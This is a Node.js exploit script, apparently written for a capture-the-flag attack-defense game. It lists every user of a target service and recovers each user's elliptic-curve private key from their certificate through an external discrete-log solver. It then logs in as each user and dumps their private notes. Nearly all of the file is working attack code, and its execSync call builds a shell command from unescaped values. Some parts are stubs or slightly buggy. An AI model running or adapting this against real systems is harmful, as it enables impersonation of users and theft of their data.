const rs = require('jsrsasign');
const { execSync } = require('child_process');
// const superagent = require('superagent');
const { Client, CURVE } = require('./client');

const host = process.argv[2];

function alreadyPwned(host, username) {
  // Implement cache for storing pwned users
  return false;
}

class Solver {
  constructor(url) {
    this.url = url;
  }

  solve(x, y) {
    // return superagent(this.url + '/solve').send({
    //   x,
    //   y,
    // }).set();
  }
}

/*

*/
async function main() {
  let resp, cert, priv;
  const client = new Client(`http://${host}:3000`);

  resp = await client.users();
  const users = resp.body;

  // Can parallize up to number of cores
  // Sagemath only uses 1 core
  for (const user of users) {
    if (alreadyPwned(host, user)) continue;

    const { x, y } = rs.X509.getPublicKeyFromCertPEM(user.certificate).getPublicKeyXYHex();
    console.log({ x, y });
    const k = ecdlp(x, y);
    try {
      const cert = user.certificate;
      const priv = rs.KEYUTIL.getKey({ d: k, curve: CURVE });

      resp = await client.login(cert, rs.KEYUTIL.getPEM(priv));

      resp = await client.notes();
      console.log(resp.body());
    } catch (err) {
      console.error(err);
    }
  }
}

// Probably better to implement it as server
function ecdlp(x, y) {
  const p = execSync(`python ${__dirname}/../ecdlp.py ${x} ${y}`, { shell: true, timeout: 2 * 60 * 1000 });
  return p;
}

main();
